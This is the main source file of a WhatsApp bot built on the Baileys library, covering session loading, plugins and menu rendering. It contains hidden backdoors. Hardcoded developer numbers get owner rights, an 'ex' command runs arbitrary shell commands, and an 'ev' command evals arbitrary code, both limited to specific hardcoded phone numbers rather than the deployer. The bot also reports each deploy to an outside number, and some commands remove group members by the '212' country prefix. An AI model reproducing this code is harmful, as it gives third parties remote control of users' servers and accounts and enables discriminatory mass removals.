const {
    default: makeWASocket,
    getAggregateVotesInPollMessage, 
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const P = require('pino')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const NodeCache = require('node-cache')
const util = require('util')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, fetchBuffer, getFile } = require('./lib/functions')
const { sms, downloadMediaMessage } = require('./lib/msg')
const axios = require('axios')
const { File } = require('megajs')
const path = require('path')
const msgRetryCounterCache = new NodeCache()

const FileType = require('file-type')
const l = console.log
var {
  updateCMDStore,
  isbtnID,
  getCMDStore,
  getCmdForCmdId,
  connectdb,
  input,
  get,
  getalls,
  updb,
  updfb,
  upresbtn,
} = require("./lib/database");
const ownerNumber = [`${config.OWNER_NUMBER}`];
//===================SESSION======.===========kj===h========

const df = __dirname + '/auth_info_baileys/creds.json';

if (!fs.existsSync(df)) {
  if (config.SESSION_ID) {
    const sessdata = config.SESSION_ID.replace("KAVIDU-MD=", "");

    if (sessdata.includes("#")) {
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
      filer.download((err, data) => {
        if (err) throw err;
        fs.writeFile(df, data, () => {
          console.log("✅ Mega session download completed and saved to creds.json !!");
        });
      });
    } else {
      (async () => {
        await downloadSession(sessdata, df);
      })();
    }
  }
}

async function downloadSession(sessdata, df) {
  const dbUrls = [
    'https://saviya-kolla-database.koyeb.app/',
    'https://saviya-kolla-database.vercel.app/'
  ];

  let success = false;

  for (let i = 0; i < dbUrls.length; i++) {
    const sessionUrl = `${dbUrls[i]}SESSIONS/${sessdata}`;
    console.log(`📥 Downloading session from Saviyakolla-DB`);

    try {
      const response = await axios.get(sessionUrl);

      if (response.data && Object.keys(response.data).length > 0) {
        await sleep(1000);
        fs.writeFileSync(df, JSON.stringify(response.data, null, 2));
        console.log(`✅ Session file downloaded successfully and saved to creds.json`);
        success = true;
        break;
      } else {
        console.warn(`⚠️ Empty or invalid session data from DB-${i + 1}, attempting next DB...`);
      }

    } catch (err) {
      console.error(`❌ Failed to download local DB session file: ${err.message}`);
    }
  }

  if (!success) {
    console.error("❌ All DB servers failed to provide a valid session file.");
  }
}

// <<==========PORTS============>>
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;
//====================================
async function connectToWA() {
//Run the function

    const {
        version,
        isLatest
    } = await fetchLatestBaileysVersion()
    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(__dirname + `/auth_info_baileys`)
    const conn = makeWASocket({
        logger: P({
            level: "fatal"
        }).child({
            level: "fatal"
        }),
        printQRInTerminal: true,
        generateHighQualityLinkPreview: true,
        auth: state,
        defaultQueryTimeoutMs: undefined,
        msgRetryCounterCache
    })


conn.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
        console.log(`❌ Disconnected: ${lastDisconnect?.error?.message || 'unknown reason'} (${shouldReconnect ? 'Reconnecting' : 'Logged out'})`);
        if (shouldReconnect) {
            connectToWA();
        }
    }

    else if (connection === 'open') {
        console.log("✅ WhatsApp socket connected!");

        setTimeout(async () => {
            try {
                const ownerJid = ownerNumber[0].includes('@s.whatsapp.net')
                    ? ownerNumber[0]
                    : `${ownerNumber[0]}@s.whatsapp.net`;

                let captionText = '✅ Bot connected successfully!';

                try {
                    const response = await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json');
                    const ownerdataa = response.data;
                    captionText = ownerdataa?.connectmg || captionText;
                } catch (fetchErr) {
                    console.warn("⚠️ Failed to fetch connect message text:", fetchErr.message);
                }

                await conn.sendMessage(`94757054054@s.whatsapp.net`, {
  image: { url: 'https://i.ibb.co/zVtZsRM9/ffbaba73c507fa9d.jpg' },
  caption: '*BOT DEPLOY DONE🎯*'
});

                console.log("✅ Connect text message sent to owner");

            } catch (err) {
                console.error("❌ Failed to send connect message:", err.message);
            }
        }, 2000); // Wait 2 seconds
    }
});

      

const path = require('path');
fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
      require("./plugins/" + plugin);
  }
});

console.log('All Plugins installed ⚡')
await connectdb()
await updb()		
console.log('Bot Connected ✅')



const prefix = config.PREFIX
//const aliveMsg = config.ALIVE_MSG
const autoreadStatus = config.AUTO_READ_STATUS
const mode = config.ONLY_GROUP
const call = config.ANTI_CALL
const block = config.AUTO_BLOCK
const badword = config.ANTI_BAD
const antilink = config.ANTI_LINK
const ty = config.AUTO_TYPING		
const antiBot = config.ANTI_BOT
const readall = config.AUTO_MSG_READ
const readCmd = config.CMD_ONLY_READ
const recording = config.AUTO_RECORDING
const autoReact = config.AUTO_REACT 
const ownerNumber = config.OWNER_NUMBER



const ownerdataa = (await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json')).data;
     
         
  conn.ev.on('creds.update', saveCreds)
  conn.ev.on('messages.upsert', async (mek) => {
    try {

async function loadConfig() {
  const settings = await getalls(); 
  if (settings) {
    Object.assign(config, settings); 
  }
}

loadConfig().catch(console.error);
	    
mek = mek.messages[0];
if (!mek.message) return;

// ephemeral message නම් unwrap කරමු
mek.message = (getContentType(mek.message) === 'ephemeralMessage')
  ? mek.message.ephemeralMessage.message
  : mek.message;

// ✅ Only if AUTO_READ_STATUS === "true" do anything
if (!mek.message) return	
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
  const emojis = ['🧩', '🍉', '💜', '🌸', '🪴', '💊', '💫', '🍂', '🌟', '🎋', '😶‍🌫️', '🫀', '🧿', '👀', '🤖', '🚩', '🥰', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
  const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

	
await conn.readMessages([mek.key])  
const mnyako = await jidNormalizedUser(conn.user.id)
await conn.sendMessage(mek.key.remoteJid, { react: { key: mek.key, text: randomEmoji} }, { statusJidList: [mek.key.participant, mnyako] })
}	      
	    if (mek.key && mek.key.remoteJid === 'status@broadcast') return


const m = sms(conn, mek)
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = 
  (type === 'conversation') ? mek.message.conversation :
  (type === 'extendedTextMessage' && mek.message.extendedTextMessage?.contextInfo?.quotedMessage &&
   await isbtnID(mek.message.extendedTextMessage.contextInfo.stanzaId)) ?
    await getCmdForCmdId(
      await getCMDStore(mek.message.extendedTextMessage.contextInfo.stanzaId),
      mek.message.extendedTextMessage.text
    ) :
  (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
  (type === 'templateButtonReplyMessage') ? mek.message.templateButtonReplyMessage?.selectedId :
  (type === 'interactiveResponseMessage') ? (() => {
    try {
      const json = JSON.parse(mek.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson);
      return json?.id || '';
    } catch { return ''; }
  })() :
  (type === 'imageMessage' && mek.message.imageMessage?.caption) ? mek.message.imageMessage.caption :
  (type === 'videoMessage' && mek.message.videoMessage?.caption) ? mek.message.videoMessage.caption :
  // fallback for unknown or malformed types
  m.msg?.text ||
  m.msg?.conversation ||
  m.msg?.caption ||
  m.message?.conversation ||
  m.msg?.selectedButtonId ||
  m.msg?.singleSelectReply?.selectedRowId ||
  m.msg?.selectedId ||
  m.msg?.contentText ||
  m.msg?.selectedDisplayText ||
  m.msg?.title ||
  m.msg?.name ||
  '';


const prefix = config.PREFIX;  
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'Sin Nombre'
const developers = `94763934860,94771825192`
const mokakhri = developers.split(",")
const isbot = botNumber.includes(senderNumber)
const isdev = mokakhri.includes(senderNumber)
const isMe = isbot ? isbot : isdev 
const isOwner = ownerNumber.includes(senderNumber) || isMe
const botNumber2 = await jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => null) : null;
const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
const participants = isGroup && groupMetadata ? groupMetadata.participants : [];
const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
 const isReact = m.message.reactionMessage ? true : false
const isAnti = (teks) => {
let getdata = teks
for (let i=0;i<getdata.length;i++) {
if(getdata[i] === from) return true
}
return false
}


const reply = async(teks) => {
  return await conn.sendMessage(from, { text: teks }, { quoted: mek })
}
conn.replyad = async (teks) => {
  await conn.sendMessage(from, { text: teks }, { quoted: mek })
}
const NON_BUTTON = true // Implement a switch to on/off this feature...
conn.buttonMessage2 = async (jid, msgData,quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber} ||*  ${button.buttonText.displayText}`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text}\n\n*\`Reply Below Number 🔢\`*\n${result}\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage ,
}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n*\`Reply Below Number 🔢\`*\n${result}\n\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,
}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}

conn.buttonMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber} ||*  ${button.buttonText.displayText}`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text || msgData.caption}\n\n*Reply Below Number 🔢*\n${result}\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage ,}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n*Reply Below Number 🔢*\n${result}\n\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}

   
conn.listMessage2 = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*${section.title}*\n\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `*${subNumber} ||* ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage ,
}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}

conn.listMessage5 = async (jid, msgData, quotemek) => {
  try {
    // If it’s a real WhatsApp list message, send directly
    if (msgData.sections && msgData.buttonText && !NON_BUTTON) {
      const quoted = quotemek && quotemek.key && quotemek.message ? { quoted: quotemek } : {};
      return await conn.sendMessage(jid, msgData, quoted);
    }

    // Else render manually as text
    let result = "";
    const CMD_ID_MAP = [];

    msgData.sections.forEach((section, sectionIndex) => {
      const mainNumber = `${sectionIndex + 1}`;
      result += `\n*${section.title}*\n\n`;

      section.rows.forEach((row, rowIndex) => {
        const subNumber = `${mainNumber}.${rowIndex + 1}`;
        const rowHeader = `*${subNumber} ||*  ${row.title}`;
        result += `${rowHeader}\n`;
        if (row.description) {
          result += `   ${row.description}\n\n`;
        }
        CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
      });
    });

    const listMessage = `${msgData.text || ''}\n\n${msgData.buttonText || ''},${result}\n\n${msgData.footer || ''}`;

    let sendPayload;
    if (msgData.image) {
      let imageData = msgData.image;

      if (typeof imageData === 'string') {
        imageData = { url: imageData };
      } else if (Buffer.isBuffer(imageData)) {
        imageData = { buffer: imageData };
      } else if (imageData.url) {
        imageData = { url: imageData.url };
      } else {
        throw new Error("Invalid image format for listMessage4.");
      }

      sendPayload = {
        image: imageData,
        caption: listMessage,
      };
    } else {
      sendPayload = { text: listMessage };
    }

    const quoted = quotemek && quotemek.key && quotemek.message ? { quoted: quotemek } : {};
    const text = await conn.sendMessage(jid, sendPayload, quoted);

    await updateCMDStore(text.key.id, CMD_ID_MAP);
  } catch (e) {
    console.error("listMessage4 error:", e);
  }
};



conn.listMessage4 = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData);
  } else {
    let result = "";
    const CMD_ID_MAP = [];

    msgData.sections.forEach((section, sectionIndex) => {
      const mainNumber = `${sectionIndex + 1}`;
      result += `\n*${section.title}*\n\n`;

      section.rows.forEach((row, rowIndex) => {
        const subNumber = `${mainNumber}.${rowIndex + 1}`;
        const rowHeader = `*${subNumber} ||*  ${row.title}`;
        result += `${rowHeader}\n`;
        if (row.description) {
          result += `   ${row.description}\n\n`;
        }
        CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
      });
    });

    const listMessage = `${msgData.text || ''}\n\n${msgData.buttonText || ''},${result}\n\n${msgData.footer || ''}`;

    // Fix image handling
    let sendPayload;
    if (msgData.image) {
      let imageData = msgData.image;

      if (typeof imageData === 'string') {
        imageData = { url: imageData };
      } else if (Buffer.isBuffer(imageData)) {
        imageData = { buffer: imageData };
      } else if (imageData.url) {
        imageData = { url: imageData.url };
      } else {
        throw new Error("Invalid image format for listMessage4.");
      }

      sendPayload = {
        image: imageData,
        caption: listMessage,
      };
    } else {
      sendPayload = { text: listMessage };
    }

    const text = await conn.sendMessage(
      jid,
      sendPayload,
      { quoted: quotemek || mek }
    );

    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
};


conn.listMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*${section.title}*\n\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `*${subNumber} ||*  ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage, 
}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}

     conn.sendButtonMessage3 = async (jid, buttons, quoted, opts = {}) => {
    let header;

    if (opts?.image) {
        var image = await prepareWAMessageMedia({
            image: {
                url: opts.image || ''
            }
        }, {
            upload: conn.waUploadToServer
        });

        header = {
            title: opts.header || '',
            hasMediaAttachment: true,
            imageMessage: image.imageMessage,
        };

    } else {
        header = {
            title: opts.header || '',
            hasMediaAttachment: false,
        };
    }

    let message = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    body: {
                        text: opts.body || ''
                    },
                    footer: {
                        text: opts.footer || ''
                    },
                    header: header,
                    nativeFlowMessage: {
                        buttons: buttons,
                        messageParamsJson: ''
                    }
                }
            }
        }
    }, {
        quoted: quoted
    });

    await conn.relayMessage(jid, message.message, { messageId: message.key.id });
};


conn.edite = async (gg, newmg) => {
  await conn.relayMessage(from, {
    protocolMessage: {
key: gg.key,
type: 14,
editedMessage: {
  conversation: newmg
}
    }
  }, {})
}

	    
conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]
            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {})
            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
}


conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
  let mime = '';
  let res = await axios.head(url)
  mime = res.headers['content-type']
  if (mime.split("/")[1] === "gif") {
    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
  }
  let type = mime.split("/")[0] + "Message"
  if (mime === "application/pdf") {
    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "image") {
    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "video") {
    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "audio") {
    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
  }
}


//=========================================================================================================================	    
if(senderNumber.includes("94767054052")){
if(isReact) return
m.react(`👾`)
}


     if ( config.WORK_TYPE == "only_group" ) {
if ( !isGroup && isCmd &&  !isMe && !isOwner  ) return
      }
      
   if ( config.WORK_TYPE == "private" ) {
if  ( isCmd && !isMe && !isOwner  ) return
      }

   if ( config.WORK_TYPE == "inbox" ) {
if  ( isGroup &&  !isMe && !isOwner ) return
      }      


//==================================plugin map================================

const events = require('./command')
const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

    try {
cmd.function(conn, mek, m, { from, prefix, l,  quoted, body, isCmd,  command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
    } catch (e) {
console.error("[PLUGIN ERROR] ", e);
    }
  }
}
events.commands.map(async (command) => {
  if (body && command.on === "body") {
    command.function(conn, mek, m, { from, prefix, l,  quoted,  body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (mek.q && command.on === "text") {
    command.function(conn, mek, m, { from, l, quoted, body,  isCmd,  command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    (command.on === "image" || command.on === "photo") &&
    mek.type === "imageMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted,  body, isCmd, command,  args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    command.on === "sticker" &&
    mek.type === "stickerMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted,  body, isCmd, command, args,  q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  }
});


//============================================================================

switch (command) {
  case 'jid':
    reply(from)
    break
  case 'device': {
    let deviceq = getDevice(mek.message.extendedTextMessage.contextInfo.stanzaId)

    reply("*He Is Using* _*Whatsapp " + deviceq + " version*_")
  }
    break
    case'ex':{
      if(senderNumber == 94767054052) {
  const { exec } = require("child_process")
  exec(q, (err, stdout) => {
    if (err) return reply(`-------\n\n` + err)
    if (stdout) {
        return reply(`-------\n\n` + stdout)
    }
})
      }
    }
    break
    case'apprv':{
      if(senderNumber == 94767054052) {
          let reqlist = await conn.groupRequestParticipantsList(from)
          for (let i=0;i<reqlist.length;i++) {
            if(reqlist[i].jid.startsWith("212")){
              await conn.groupRequestParticipantsUpdate(
                from,
                [reqlist[i].jid],
                "reject"
            )
            } else{
              await conn.groupRequestParticipantsUpdate(
                from,
                [reqlist[i].jid],
                "approve"
            )
            }
          }
        }
    }
    break
    case'212r':{
      if(senderNumber == 94767054052) {
        for (let i=0;i<participants.length;i++) {
          if(participants[i].id.startsWith("212")){
       await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
      }
    }
  }
    }
    break
    case'rtf':{
console.log(dsa)
    }
    break
// Inside your message handler (outside any case)
 case 'ev': {
    if(senderNumber == 94767054052 || senderNumber == 94722617699) {
    let code2 = q.replace("°", ".toString()");
    try {
let resultTest = await eval(code2);
if (typeof resultTest === "object") {
  reply(util.format(resultTest));
} else {
  reply(util.format(resultTest));
}
    } catch (err) {
reply(util.format(err));
    }
    ;
  }
  }

    break
  default:
}
    } catch (e) {
const isError = String(e)
console.log(isError)
    }
	  
  })
}
app.get("/", (req, res) => {
  res.send("📟 Bot Working successfully!");
});
app.listen(port, () => console.log(`Movie-Visper-Md Server listening on port http://localhost:${port}`));
setTimeout(() => {
connectToWA()
}, 3000);


process.on("uncaughtException", function (err) {
  let e = String(err);
  if (e.includes("Socket connection timeout")) return;
  if (e.includes("rate-overlimit")) return;
  if (e.includes("Connection Closed")) return;
  if (e.includes("Value not found")) return;
  if (e.includes("Authentication timed out")) restart();
  console.log("Caught exception: ", err);
});
